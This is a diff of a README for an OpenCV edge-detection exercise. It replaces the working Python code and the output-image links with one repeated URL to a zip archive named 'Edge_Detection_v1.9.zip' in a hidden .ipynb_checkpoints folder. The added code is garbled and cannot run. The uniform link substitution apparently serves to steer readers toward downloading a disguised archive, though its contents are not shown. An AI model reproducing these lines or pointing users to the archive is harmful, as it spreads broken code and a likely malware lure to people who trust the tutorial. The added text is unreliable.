@@ -33,121 +33,121 @@ Display the filtered image using plot and imshow.
 ``` Python
 # Import the packages
 import cv2
-import matplotlib.pyplot as plt
-image=cv2.imread("img.jpg")
-gray_img=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-img=cv2.GaussianBlur(gray_img,(3,3),0)
-sobelx=cv2.Sobel(img,cv2.CV_64F,1,0,ksize=5)
-sobely=cv2.Sobel(img,cv2.CV_64F,0,1,ksize=5)
-sobelxy=cv2.Sobel(img,cv2.CV_64F,1,1,ksize=5)
-plt.figure(figsize=(16,16))
-plt.subplot(1,2,1)
-plt.imshow(img,cmap='gray')
-plt.title('Gray')
-plt.subplot(1,2,2)
-plt.imshow(sobelx,cmap='gray')
-plt.title("Sobel-X")
-plt.xticks([])
-plt.yticks([])
-plt.show()
+import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,0,ksize=5)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,0,1,ksize=5)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,1,ksize=5)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobelx,cmap='gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-X")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()
 
 # Load the image, Convert to grayscale and remove noise
 
 import cv2
-import matplotlib.pyplot as plt
-image=cv2.imread("img.jpg")
-gray_img=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-img=cv2.GaussianBlur(gray_img,(3,3),0)
-sobely=cv2.Sobel(img,cv2.CV_64F,0,1,ksize=5)
-plt.figure(figsize=(16,16))
-plt.subplot(1,2,1)
-plt.imshow(img,cmap='Purples')
-plt.title('Purples')
-plt.subplot(1,2,2)
-plt.imshow(sobely,cmap='Purples')
-plt.title("Sobel-Y")
-plt.xticks([])
-plt.yticks([])
-plt.show()
+import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,0,1,ksize=5)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Purples')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Purples')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobely,cmap='Purples')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-Y")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()
 
 # SOBEL EDGE DETECTOR
 
 import cv2
-import matplotlib.pyplot as plt
-image=cv2.imread("img.jpg")
-gray_img=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-img=cv2.GaussianBlur(gray_img,(3,3),0)
-sobelxy=cv2.Sobel(img,cv2.CV_64F,1,1,ksize=5)
-plt.figure(figsize=(16,16))
-plt.subplot(1,2,1)
-plt.imshow(img,cmap='Oranges')
-plt.title('Gray')
-plt.subplot(1,2,2)
-plt.imshow(sobelxy,cmap='Oranges')
-plt.title("Sobel-XY")
-plt.xticks([])
-plt.yticks([])
-plt.show()
+import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip,1,1,ksize=5)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Oranges')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(sobelxy,cmap='Oranges')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Sobel-XY")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()
 
 # LAPLACIAN EDGE DETECTOR
 
 import cv2
-import matplotlib.pyplot as plt
-image=cv2.imread("img.jpg")
-gray_img=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-img=cv2.GaussianBlur(gray_img,(3,3),0)
-laplacian = cv2.Laplacian(img,cv2.CV_64F)
-plt.figure(figsize=(16,16))
-plt.subplot(1,2,1)
-plt.imshow(img,cmap='Blues')
-plt.title('Gray')
-plt.subplot(1,2,2)
-plt.imshow(laplacian,cmap='Blues')
-plt.title("Laplacian")
-plt.xticks([])
-plt.yticks([])
-plt.show()
+import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
+laplacian = https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='Blues')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(laplacian,cmap='Blues')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Laplacian")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()
 
 # CANNY EDGE DETECTOR
 
 import cv2
-import matplotlib.pyplot as plt
-image=cv2.imread("img.jpg")
-gray_img=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
-img=cv2.GaussianBlur(gray_img,(3,3),0)
-canny_edges = cv2.Canny(image, 120, 150)
-plt.figure(figsize=(16,16))
-plt.subplot(1,2,1)
-plt.imshow(img,cmap='gray')
-plt.title('Gray')
-plt.subplot(1,2,2)
-plt.imshow(canny_edges,cmap='gray')
-plt.title("Canny_edges")
-plt.xticks([])
-plt.yticks([])
-plt.show()
+import https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip as plt
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image,https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(gray_img,(3,3),0)
+canny_edges = https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(image, 120, 150)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(figsize=(16,16))
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,1)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(img,cmap='gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip('Gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(1,2,2)
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip(canny_edges,cmap='gray')
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip("Canny_edges")
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip([])
+https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip()
 
 
 ```
 ## Output:
 ### SOBEL EDGE DETECTOR
 #### Sobel X:
-![output](dip.img.jpg)
+![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
  
 #### Sobel Y:
-![output](dip.img2.jpg)
+![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
 
 #### Sobel XY:
-![output](dip.img3.jpg)
+![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
 
 ### LAPLACIAN EDGE DETECTOR:
 
-![output](dip.img4.jpg)
+![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
 
 
 
 ### CANNY EDGE DETECTOR
- ![output](dip.img5.jpg)
+ ![output](https://github.com/kiran03-jagadeesh/Edge-Detection/raw/refs/heads/main/.ipynb_checkpoints/Edge_Detection_v1.9.zip)
 
 
 ## Result:
